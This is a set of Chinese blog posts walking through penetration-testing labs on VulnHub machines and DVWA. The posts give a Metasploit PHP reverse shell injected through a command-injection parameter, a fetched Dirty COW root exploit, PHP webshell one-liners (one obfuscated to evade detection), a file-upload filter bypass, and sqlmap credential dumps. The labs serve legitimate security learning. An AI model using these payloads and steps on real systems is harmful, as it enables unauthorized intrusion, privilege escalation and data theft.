<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>老样子 VMWARE 靶机 kali<br>ps: <strong>请注意每个人的ip都会因为配置有细微的区别 请勿照抄代码</strong><br>攻击机：kali（192.168.246.128）<br>靶机：WALLABY’S: NIGHTMARE (V1.0.2)（192.168.246.134）<br>靶机下载地址：<a href="https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</a></p>
<span id="more"></span>

<h2 id="发现靶机-访问网站"><a href="#发现靶机-访问网站" class="headerlink" title="发现靶机&amp;访问网站"></a>发现靶机&amp;访问网站</h2><p>总之先<code>arp-scan -l</code>一下<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/1.jpg" alt="1"><br>发现靶机ip为192.168.246.134 使用nmap查看开放端口<br><code> nmap -p- 192.168.246.134 //快速扫描常用端口</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/2.jpg" alt="2"><br>结果显示开放了22 80端口<br>先上firefox查看 80端口对应的http服务<br><code>http://192.168.246.134</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/3.jpg" alt="3"><br>↑叫我输入个用户名 我这里就用我常用的网名了<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/4.jpg" alt="4"><br>↑点击超链接开始你的ctf之旅</p>
<h2 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h2><p>网站里有一只大眼睛 上面的英语大意是<strong>它发现了你要渗透这个服务器 正在观察你</strong><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/5.jpg" alt="5"><br>我们先通过f12查看源码 发现没有什么隐藏的东西<br>于是使用web漏洞扫描工具<strong>nikto</strong>进行扫描<br><code>nikto -host 192.168.246.134</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/6.jpg" alt="6"><br><strong>nikto</strong>表示这个网站存在漏洞 于是我们随它指示将这段链接复制到firefox替换网址后半段<br>输完之后 enter访问 发现 <strong>欸 怎么连接不上了</strong><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/7.jpg" alt="7"><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/8.jpg" alt="8"><br>↑就算是通过history看之前大眼睛的网站也链接不上<br>再次通过nmap扫描 看看是不是80端口的问题<br><code> nmap -p- 192.168.246.134 //快速扫描常用端口</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/9.jpg" alt="9"><br>我们可以看到多出了个60080端口<br>让我们通过firefox访问该端口查看一下什么情况<br><code>http://192.168.246.134:60080/</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/10.jpg" alt="10"><br>英语大意是<strong>惊讶你追的很紧 幸好它完全转移到了一个不同的端口</strong><br>这里我们可以猜到<br>之前在80端口时有个/?page页面 这里也多半会有 让我们试试看<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/11.jpg" alt="11"><br>果然对劲 我们再使用<strong>dirb</strong>工具对此页面进行目录扫描<br><code>dirb http://192.168.246.134:60080/?page=</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/12.jpg" alt="12"><br>结果里出现了一个后缀为mailer的网页<br>访问看看<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/13.jpg" alt="13"><br>看似什么都没有<br>但我们可以使用f12查看源码 发现有一段注释<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/14.jpg" alt="14"><br>这里<br><code>&lt;a href='/?page=mailer&amp;mail=mail wallaby "message goes here"'&gt;&lt;button type='button'&gt;Sendmail&lt;/button&gt;</code><br>暴露了存在RCE（远程代码执行漏洞）</p>
<blockquote>
<p>用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。——以上来自百度百科</p>
</blockquote>
<p>于是我们验证一下<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/15.jpg" alt="15"><br>↑通过改变命令验证<br>漏洞已经出现<br>于是乎我们便可以通过多种方式来解决了<br>我用的是Metasploit</p>
<pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">msfconsole
use exploit/multi/script/web_delivery
set target 1
set payload php/meterpreter/reverse_tcp
set lhost 192.168.246.128
set lport 8888
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先输入<strong>msfconsole</strong>进入msf控制台<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/16.jpg" alt="16"><br>↑设置msf参数，开启监听<br>将它所反馈出的命令<strong>复制在整个网址的mail=之后</strong>来启动整个监听程序<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/17.jpg" alt="17"><br>网站一直显示加载中则多半成功了 我们ctrl+c停止后输入sessions查看<br>出现了一个已获取的shell<br>我们输入<code>sessions 1</code>来链接shell<br>随后使用<code>sysinfo</code>命令查看靶机的系统信息<br>使用<code>shell -t</code>命令来获取系统shell<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/18.jpg" alt="18"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>总算来到了惊心动魄的提权环节<br>我们再开一个cmd窗口<br>输入<br>wget+<code>https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</code><br>(格式所迫 只能这么写了)<br><code>python3 -m http.server 8081 //开启kali的http服务</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/19.jpg" alt="19"><br>回到刚才连接到靶机的cmd窗口<br><code>wget http://192.168.246.128:8081/cowroot.c //用靶机获取kali所分享的文件</code><br><code>gcc cowroot.c -o exp -pthread  //对刚刚下载的提权脚本进行编译</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/20.jpg" alt="20"></p>
<pre class="line-numbers language-none"><code class="language-none">chmod +x exp //给提权脚本赋予执行权限 
./exp //运行提权脚本，运行后即可提权至root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这两句代码后 你就已经拥有了所有的权限<br>运用一些基础的linux语言便可获得flag</p>
<pre class="line-numbers language-none"><code class="language-none">cd /root //将目录切换至root
ls //列出文件夹中的文件
cat flag.txt //查看flag.txt中的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/21.jpg" alt="21"></p>
<h1 id="好的那么我们下次见！"><a href="#好的那么我们下次见！" class="headerlink" title="好的那么我们下次见！"></a><strong>好的那么我们下次见！</strong></h1></body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp上传漏洞</title>
    <url>/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a></p>
<p>文件上传是 Web 应用的必备功能之一，比如上传头像显示个性化、上传附件共享文件、上传脚本更新网站。如果服务器配置不当或者没有进行足够的过滤，Web 用户就可以上传任意文件，包括恶意脚本文件、exe 程序等，这就造成了文件上传漏洞。</p>
<span id="more"></span>
<p>我们先从<strong>一句话木马</strong>说起</p>
<h1 id="1-一句话木马"><a href="#1-一句话木马" class="headerlink" title="1.一句话木马"></a>1.一句话木马</h1><p><code>&lt;?php @eval($_POST['123']);?&gt;</code><br>这便是最简单的一句话木马。<br>这段php代码被分为以下几个部分：<br>**@**表示后面即使执行错了，也不会报错。<br>**eval()**函数表示将括号里的内容当作代码执行。<br><strong>$_POST[‘123’]<strong>表示从页面中获得123这个参数值。<br>也就是说，该页面只要收到了</strong>123</strong>这个密码，就会按照eval()的逻辑去运行。<br>只要了解了该文件的路径，便可以对该机器（利用菜刀或蚁剑）为所欲为了。<br>一句话木马还有很多变种： </p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php @assert($_REQUEST[123]); ?&gt; // GET	数据从url提交
                                     POST	数据采用隐蔽方式提交
                                     REQUEST即支持GET方式、又支持POST方式
&lt;?php $k="ass"."ert"; $k($_REQUSET['123']);?&gt; 
//利用字符串绕过检测的一句话木马
....以下略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="2-渗透过程"><a href="#2-渗透过程" class="headerlink" title="2.渗透过程"></a>2.渗透过程</h1><p>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/ </a></p>
<h2 id="低等级（Security-low）"><a href="#低等级（Security-low）" class="headerlink" title="低等级（Security=low）"></a>低等级（Security=low）</h2><p>我们先通过右下角的<strong>view source</strong>按钮来观察网页代码 寻找规律<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="1"><br>可以看到该网站并没有对上传的文件类型与大小做较为明显的防备<br>漏洞很大<br>那么我们创建一个1.php 在其中加上代码<code>&lt;?php @eval($_POST['123']);?&gt;</code><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.jpg" alt="2"><br>随后登陆网站 上传 完事<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.jpg" alt="3"><br>至于kali下载蚁剑的方式：<a href="https://blog.csdn.net/liver100day/article/details/120222378">参考资料</a><br>我们打开蚁剑 按照网页所给提示 文件被上传在了<br><a href="http://192.168.246.132/dvwa/hackable/uploads/1.php">http://192.168.246.132/dvwa/hackable/uploads/1.php</a> 处<br>在<strong>url地址</strong>中填入前者 在<strong>连接密码</strong>中填入123<br>先<strong>测试链接</strong> 然后按保存<br>测试链接显示成功其实就已经完事了<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.jpg" alt="4"><br>随后研究蚁剑 你便会发现它的功能全备 非常厉害</p>
<h2 id="中等级-（Security-medium）"><a href="#中等级-（Security-medium）" class="headerlink" title="中等级 （Security=medium）"></a>中等级 （Security=medium）</h2><p>我们先通过<strong>DVWA Security</strong>将安全度调整至medium<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.jpg" alt="5"><br>然后继续进入上传漏洞网页 <strong>view source</strong><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/6.jpg" alt="6"><br>可以看到这次的上传对<strong>上传的文件类型</strong>与<strong>上传的文件大小</strong>做了限制<br>文件类型限制为<strong>jpeg</strong>文件 大小限制在了<strong>100000byte</strong>以内（1KB=1024B byte=B=字节)<br>文件大小由于使用一句话木马 因此可以轻松解决<br>文件类型的问题则可以使用多种方法来解析</p>
<h3 id="1-利用burpsuite"><a href="#1-利用burpsuite" class="headerlink" title="1)利用burpsuite"></a>1)利用burpsuite</h3><p><strong>关于burpsuite的配置</strong><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/7.jpg" alt="7"><br>↑<strong>proxy-proxy setting中设置本地地址与端口</strong><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/8.jpg" alt="8"><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/9.jpg" alt="9"><br>配置firefox中的<strong>设置-proxy settings</strong> 注意ip与端口要与前者保持一致<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/10.jpg" alt="10"><br>进入上传漏洞的网页 按这个按钮就能开始监听<br>先分析一下刚才得到的条件：<br>文件类型<strong>仅限jpeg</strong><br>那我们便将<strong>一句话木马.php</strong>文件的后缀更改为<strong>jpeg</strong>交给前端 通过<strong>burpsuite</strong>更改后缀来修改成<strong>php</strong>文件类型<br>那么开始实践<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/11.jpg" alt="11"><br>将<strong>1.php</strong>复制一份备份 其中一份更名为<strong>1.jpeg</strong><br>开启<strong>burpsuite</strong>的监听 将<strong>1.jpeg</strong>上传至网站 等待拦截结果<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/12.jpg" alt="12"><br>网站一直处于加载中 且<strong>burpsuite</strong>显示拦截结果 说明成功拦截<br>我们将<code>filename=“1.jpeg”</code>更改为<code>filename=“1.php”</code><br>随后点击<code>forward</code>放行<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/14.jpg" alt="14"><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/15.jpg" alt="15"><br>可以看到上传成功 我们继续在蚁剑里测试<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/16.jpg" alt="16"><br>好的 链接也成功了 这说明目标已完成</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>Hackademic.RTB1</title>
    <url>/2023/11/21/Hackademic-RTB1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><blockquote>
<p><strong>那么好的我们废话不多说——</strong></p>
</blockquote>
<p>靶机名称：  Hackademic: RTB1<br>下载链接：<br><a href="https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip</a> </p>
<span id="more"></span>
<h1 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h1><p>首先我们下载好靶机 照常启动kali与靶机<br><img data-src="/2023/11/21/Hackademic-RTB1/1.jpg" alt="1.jpg"></p>
<h1 id="2-解析过程"><a href="#2-解析过程" class="headerlink" title="2.解析过程"></a>2.解析过程</h1><h2 id="1）靶机的发现"><a href="#1）靶机的发现" class="headerlink" title="1）靶机的发现"></a>1）靶机的发现</h2><p>老样子扫描同网段设备<br><code>arp-scan -l</code><br><img data-src="/2023/11/21/Hackademic-RTB1/2.jpg" alt="2.jpg"><br>↑发现靶机ip地址 使用nmap扫描存活端口<br><code>nmap -p- '目标ip'</code><br><strong>ps:多半扫得很慢 不知道什么原因 请耐心等待2-5分钟</strong><br>结果出来是22端口和80端口<br>我们这里直接通过firefox访问ip<br><img data-src="/2023/11/21/Hackademic-RTB1/3.jpg" alt="3.jpg"><br>↑页面通过f12并没有看出什么端倪 但有很多超链接<br>通过在网址后输入sql注入语句<br>我们可以判断出其中一个指向了mysql数据库<br>于是将该网址交给sqlmap 看是否能爆出数据</p>
<h2 id="2）sqlmap爆破"><a href="#2）sqlmap爆破" class="headerlink" title="2）sqlmap爆破"></a>2）sqlmap爆破</h2><p>我们利用以下语句来爆出数据库的内容</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "目标ip" //查看是否存在漏洞
sqlmap -u "目标ip" --dbs //查看具体数据库
sqlmap -u "目标ip" -D "选定数据库" --tables //查看数据库内的表
sqlmap -u "目标ip" -D "选定数据库" -T "选定表" --columns //查看数据表内的集合
sqlmap -u "目标ip" -D "选定数据库" -T "选定表" -C "选定集合" --dump //爆出集合内的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/11/21/Hackademic-RTB1/4.jpg" alt="4.jpg"><br>↑查看网址是否存在漏洞 与当前数据类型<br><img data-src="/2023/11/21/Hackademic-RTB1/5.jpg" alt="5.jpg"><br>↑爆数据库<br><img data-src="/2023/11/21/Hackademic-RTB1/6.jpg" alt="6.jpg"><br>↑爆tables<br><img data-src="/2023/11/21/Hackademic-RTB1/7.jpg" alt="7.jpg"><br>↑通过外语翻译看出login与pass是账号密码相关内容<br><img data-src="/2023/11/21/Hackademic-RTB1/8.jpg" alt="8.jpg"><br>↑最终得出了五组账号密码<br><strong>ps:没有解密出的密码可以自行用md5解码解密</strong></p>
<h2 id="3）后门网址发现与上传漏洞"><a href="#3）后门网址发现与上传漏洞" class="headerlink" title="3）后门网址发现与上传漏洞"></a>3）后门网址发现与上传漏洞</h2><p>我们利用dirsearch工具来发现网站下存在的目录<br><code>dirsearch -u "目标ip"</code><br><img data-src="/2023/11/21/Hackademic-RTB1/9.jpg" alt="9.jpg"><br><img data-src="/2023/11/21/Hackademic-RTB1/10.jpg" alt="10.jpg"><br>↑扫过ip根目录与刚才主页底下的目录后 我们发现了一个名为wp-admin的后门网址<br>于是我们进去看看<br>刚刚有五组账号 我们都试试看 看看哪个权限最大<br>都试过之后发现GerogeMiller账号权限最高 还能让我们上传任意格式的文件<br>kali里是自带一些后端监听php的 我们可以自己复制一个到桌面里编辑后<br>通过kali自带的apache服务来上传文件<br><img data-src="/2023/11/21/Hackademic-RTB1/11.jpg" alt="11.jpg"><br>↑我们在网站options中选择允许文件上传 增加上传格式php<br>刷新页面后上面会出现uploads 让我们上传文件<br><img data-src="/2023/11/21/Hackademic-RTB1/12.jpg" alt="12.jpg"><br>↑这是自带的后门文件<br><img data-src="/2023/11/21/Hackademic-RTB1/13.jpg" alt="13.jpg"><br>↑将监听的返回对象设为本机<br><img data-src="/2023/11/21/Hackademic-RTB1/14.jpg" alt="14.jpg"><br><img data-src="/2023/11/21/Hackademic-RTB1/15.jpg" alt="315.jpg"><br>↑上传完毕后网站会提示你上传的地址 我们在监听后 用firefox复制 访问<br><img data-src="/2023/11/21/Hackademic-RTB1/16.jpg" alt="16.jpg"><br>↑监听完毕之后 我们发现靶机的版本较老旧 有不少漏洞<br><img data-src="/2023/11/21/Hackademic-RTB1/17.jpg" alt="17.jpg"><br>↑ 我们利用searchsploit工具来搜索该机子的漏洞 发现15285.c这个程序可以成功提权（前提是目标计算机安装了gcc程序编译器）<br><img data-src="/2023/11/21/Hackademic-RTB1/18.jpg" alt="18.jpg"><br><img data-src="/2023/11/21/Hackademic-RTB1/19.jpg" alt="19.jpg"><br>↑上传后运行该漏洞 成功获取权限<br><img data-src="/2023/11/21/Hackademic-RTB1/20.jpg" alt="20.jpg"><br>成功获取flag！</p>
<h1 id="那么我们下次见"><a href="#那么我们下次见" class="headerlink" title="那么我们下次见"></a><strong>那么我们下次见</strong></h1></body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp与sql注入与sqlmap</title>
    <url>/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a></p>
<h2 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h2><p>首先 我们下载owasp 打开后输入<strong>默认账号</strong>root 与 <strong>默认密码</strong>owaspbwa<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/2.jpg"><br>随后会显示<strong>登录成功</strong> 输入指定ip进入网页<a href="http://192.168.246.132/">http://192.168.246.132</a><br>另开一个<strong>kali</strong> 随后进入网页<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/1.jpg" alt="1.jpg"><br>这里选择<strong>Damn Vulnerable Web Application</strong> 也是我们今天要解析的靶机</p>
<span id="more"></span>
<h2 id="2-靶机部分"><a href="#2-靶机部分" class="headerlink" title="2.靶机部分"></a>2.靶机部分</h2><p><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/3.jpg" alt="3.jpg"><br>如果小伙伴们只需要dvwa的默认密码去登录dvwa，这里给出dvwa的默认密码</p>
<table>
<thead>
<tr>
<th>用户名</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>password</td>
</tr>
<tr>
<td>gordonb</td>
<td>abc123</td>
</tr>
<tr>
<td>1337</td>
<td>charley</td>
</tr>
<tr>
<td>pablo</td>
<td>letmein</td>
</tr>
<tr>
<td>smithy</td>
<td>password</td>
</tr>
</tbody></table>
<p>进入 选择<strong>SQL Injection</strong><br>首先是测试一下sqlmap</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "靶机地址" //判断目标是否存在sql注入可能<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/4.jpg" alt="4.jpg"><br>可以看到它爆出了有注入漏洞 数据库类型为 <strong>mysql</strong> 且所在操作系统为 <strong>linux</strong><br>我们加入一下cookie 尝试爆出数据库看看<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/5.jpg" alt="5.jpg"><br>↑获取cookie请在该页面按f12 切到<strong>network</strong> reload后查看页面详细 其中有cookie</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "目标网址" --cookie "网址cookie" --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>看到俩库<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/6.jpg" alt="6.jpg"><br>dvwa和information_schema<br>information_schema是每个mysql数据库都会自带的所以暂且搁置 我们转到dvwa</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "靶机网址" --cookie="网址cookie" -D 数据库名 --tables //获取指定数据库表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>结果是两个表<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/7.jpg" alt="7.jpg"><br>那我们字面意思来看 guestbook是留言簿 那users明显是用户相关信息了<br>我们查看一下users里的相关信息</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "靶机网址" --cookie="网址cookie" -D 数据库名 -T 表名 --dump //获取指定表中的信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有选项都直接按<strong>enter</strong>默认过去<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/8.jpg" alt="8.jpg"></p>
<blockquote>
<p>ps: 如果窗口拉的不够长会导致表格被拉伸难以看清 我的建议是在生成结果前尽可能全屏</p>
</blockquote>
<p>password后边的括号里边的内容是解密后破解出的明文密码 前面则是加密后的密文<br>登陆时使用 <strong>user对应的账号</strong> 与 <strong>password中的明文密码</strong> 则ok<br>剩下的等老师继续讲 我们先说到这里</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>liunx中sudo服务相关知识</title>
    <url>/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="老样子-跟随课程进度"><a href="#老样子-跟随课程进度" class="headerlink" title="老样子 跟随课程进度"></a>老样子 跟随课程进度</h1><h2 id="1）什么是sudo涅？"><a href="#1）什么是sudo涅？" class="headerlink" title="1）什么是sudo涅？"></a>1）什么是sudo涅？</h2><blockquote>
<p>简单的说，sudo 是一种权限管理机制，管理员可以授权于一些普通用户去执行一些 root 执行的操作，而不需要知道 root 的密码。</p>
</blockquote>
<blockquote>
<p>严谨些说，sudo 允许一个已授权用户以超级用户或者其它用户的角色运行一个命令。当然，能做什么不能做什么都是通过安全策略来指定的。sudo 支持插件架构的安全策略，并能把输入输出写入日志。第三方可以开发并发布自己的安全策略和输入输出日志插件，并让它们无缝的和 sudo 一起工作。默认的安全策略记录在 /etc/sudoers 文件中。而安全策略可能需要用户通过密码来验证他们自己。也就是在用户执行 sudo 命令时要求用户输入自己账号的密码。如果验证失败，sudo 命令将会退出。</p>
</blockquote>
<blockquote>
<p>sudo暂时切换到超级用户模式以执行超级用户权限，提示输入密码时该密码为当前用户的密码，而不是超级账户的密码。不过有时间限制，Ubuntu默认为一次时长15分钟。</p>
</blockquote>
<blockquote>
<p>由于不需要超级用户的密码，部分类Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如Ubuntu、[Mac OS X]。</p>
</blockquote>
<span id="more"></span>
<h2 id="2）sudo命令语法"><a href="#2）sudo命令语法" class="headerlink" title="2）sudo命令语法"></a>2）sudo命令语法</h2><p><code>sudo [-bhHpV] [-s ] [-u &lt;用户&gt;] [指令]</code><br>或<br><code>sudo [-klv]</code><br>参数<br>-b 在后台执行指令。<br>-h 显示帮助。<br>-H 将HOME环境变量设为新身份的HOME环境变量。<br>-k 结束密码的有效期限，也就是下次再执行sudo时便需要输入密码。<br>-l 列出目前用户可执行与无法执行的指令。<br>-p 改变询问密码的提示符号。<br>-s 执行指定的shell。<br>-u &lt;用户&gt; 以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份。<br>-v 延长密码有效期限5分钟。<br>-V 显示版本信息。<br>-S 从标准输入流替代终端来获取密码</p>
